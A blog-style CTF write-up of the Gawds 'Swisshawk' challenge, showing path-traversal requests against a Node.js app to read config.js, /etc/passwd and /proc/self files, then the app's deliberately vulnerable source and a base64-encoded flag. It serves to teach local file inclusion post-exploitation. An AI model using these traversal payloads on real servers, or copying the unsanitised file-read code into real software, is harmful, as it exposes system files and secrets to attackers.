---
layout: post
title: Gawds CTF/ Swisshawk 
---

## Description

This challenge seemed easy in the beginning. The second part of challenge had me breaking my head, 
it made me learn a new vector in post-exploitation of web apps.

Your friend Tamanna is in danger, swisshawk defaced her website and hidden some flags in there.

Tamanna can only restore the website if she knows the flags, please help tamanna get her website back!

[http://swisshawk.ctf.gawds.in](http://swisshawk.ctf.gawds.in)

* * * 

## The Challenge

The challenge in a sense was quite straight forward. Opening the page greets you with a steady message.

![Challenge](/public/assets/images/startup-swisshack.png) 

As always the entry point being the source, I decided to give it a look.

<pre><p>You will never be able to find the flags, I have very carefully
        hidden it somewhere here &lt;!-- page: /app path: /config.js --&gt;</p></pre>

Looking at the comment it was evident that it was a node.js application.

From the hint, the page was currently in the `app` directory. We have to go to the root directory to access the `config.js` file.

Navigating to the following page:
<pre>http://swisshawk.ctf.gawds.in/../config.js</pre>

<pre><p>module.exports = {
    PORT: process.env.PORT || 3000,
    flag1: 'flag{F1R5T_FL4G_W45NT_THAT_H4RD}',
    flag2: 'you_cant_find_me(I am the server)'
}
<!-- page: /config.js path: /config.js --></p></pre>

<strong>Flag1: flag{F1R5T_FL4G_W45NT_THAT_H4RD} </strong>

## Phase II

Now challenge was finding the second flag. The hint too was very cryptic.
<blockquote>you_cant_find_me(I am the server)</blockquote>


The hint meant flag was present inside the server's directory.

I tried directory traversal. It being a node.js app, I tried various combinations of the entry points like `app.js` `index.js`.

<pre>http://swisshawk.ctf.gawds.in/../index.js
http://swisshawk.ctf.gawds.in/../app.js
http://swisshawk.ctf.gawds.in/app.js
http://swisshawk.ctf.gawds.in/index.js
</pre>

I then tried loading the `/etc/passwd` file.
<pre>http://swisshawk.ctf.gawds.in/../../../../../../../../../../../etc/passwd</pre>

First breakthrough!

<pre>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
u57400:x:57400:57400:,,,:/app:/bin/bash
dyno:x:57400:57400:,,,:/app:/bin/bash
&lt;!-- page: /etc/passwd path: /config.js --&gt;
</pre>

But it still was a dissapointment, I wasn't able to access any of the server files. I went to as far as looking in the `/var/www/` directory.

I came across an article which discussed about post exploitation techniques after a LFI vulnerability. 

One interesting place to look for was the `/proc/` directory. This directory not only contained each process related files as well as file descriptors.

Each process has a directory named by its <strong>process id (pid).</strong>

The shortcut being, it isn't necessary to know the process id to access the directory. The current process directory can be accessed by navigating to the `/proc/self/` directory.

This directory contains four juicy files:

* environ
* cmdline
* maps
* mountinfo

Trying each file: `http://swisshawk.ctf.gawds.in/../../../../../../../proc/self/environ/`
<pre>
SHLVL=1 HOME=/app
PORT=41335PS1=\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]
VERSION=v6.12.3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NPM_VERSION=3PWD=/appDYNO=web.1NODE_CHANNEL_FD=3
&lt;!-- page: /proc/self/environ path: /config.js --&gt;</pre>

Nothing great.

`http://swisshawk.ctf.gawds.in/../../../../../../../proc/self/cmdline/`
<pre>
/usr/bin/nodeyou_cant_find_me.js
&lt;!-- page: /proc/self/cmdline path: /config.js -->
</pre>

We found the entry point of the node.js application. 

<pre>
const express = require("express");
const config = require("../config");
const flag2 = require("../flag2isHere");
const resolve = require("path").resolve;
const fs = require("fs");

const app = express();

app.use((req, res) => {
    const path = req.originalUrl.substring(1).replace('%2f', '/').replace('%2F', '/');

    let text = `You will never be able to find the flags, I have very carefully
        hidden it somewhere here`;
    if(path) {
        try {
            text = fs.readFileSync(path);
        }
        catch(err) {
            text = err;
        }
    }

    text += "&lt;!-- page: " + resolve(path) + " path: /config.js -->";
    return res.end("&lt;p>" + text + "&lt;/p>");
});

app.listen(config.PORT, () => {
    console.log("Wohooo, all set up, listening on ", config.PORT);
})&lt;!-- page: /app/you_cant_find_me.js path: /config.js -->
</pre>

We find that `../flag2isHere` is the js file containing the flag.

Going to `http://swisshawk.ctf.gawds.in/../flag2isHere.js`

<pre>
<p>module.exports = {
    flag: "ZmxhZ3tUSElTX20xR2hUX0g0dkVfQjMzbl9MMVR0TGVfdFIxY2tZfQ=="
}&lt;!-- page: /flag2isHere.js path: /config.js --></p>
</pre>

We get the base-64 encoded string. Decoding it we get the following flag.

<strong>Flag2: flag{THIS_m1GhT_H4vE_B33n_L1TtLe_tR1ckY}</strong>
